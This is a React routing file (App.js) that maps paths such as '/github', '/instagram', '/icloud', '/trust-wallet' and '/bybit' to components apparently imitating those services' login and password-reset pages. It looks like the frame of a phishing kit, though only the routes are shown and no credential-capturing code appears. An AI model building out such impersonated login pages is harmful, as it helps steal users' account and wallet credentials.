import Navbar from './components/navbar';
import { BrowserRouter, Routes, Route } from 'react-router-dom';
import Homepage from './Pages/Home';
import Githubpage from './Pages/Github';
import Forgotgitpage from './Pages/Forgotgit';
import Instagram from './Pages/Insta';
import Forgotinstagram from './Pages/ForgotInsta';
import SnapchatLogin from './Pages/Snapchat';
import Googlepage from './Pages/Google';
import Pinterestpage from './Pages/Pinterest';
import Messengerpage from './Pages/Messenger';
import Shopifylogin from './Pages/Shopify';
import Shopifyloginpage from './Pages/ShopifyLogin';
import AppleIdpage from './Pages/AppleId';
import Trustwalletlogin from './Pages/Trustwallet';
import Bybitpage from './Pages/Bybit';



function App() {
  return (
   <>
      <BrowserRouter>
      <Navbar/>
        <Routes>
          <Route path='/' element={<Homepage/>} />
          <Route path='/github' element={<Githubpage/>} />
          <Route path='/forgot-password-github' element={<Forgotgitpage/>} />
          <Route path='/instagram' element={<Instagram/>} />
          <Route path='/forgot-password-instagram' element={<Forgotinstagram/>} />
          <Route path='/snapchat' element={<SnapchatLogin/>} />
          <Route path='/google' element={<Googlepage/>} />
          <Route path='/pinterest' element={<Pinterestpage/>} />
          <Route path='/messenger' element={<Messengerpage/>} />
          <Route path='/shopify' element={<Shopifylogin/>} />
          <Route path='/shopify-login' element={<Shopifyloginpage/>} />
          <Route path='/icloud' element={<AppleIdpage/>} />
          <Route path='/trust-wallet' element={<Trustwalletlogin/>} />
          <Route path='/bybit' element={<Bybitpage/>} />








        </Routes>
      </BrowserRouter>
   </>
  );
}

export default App;
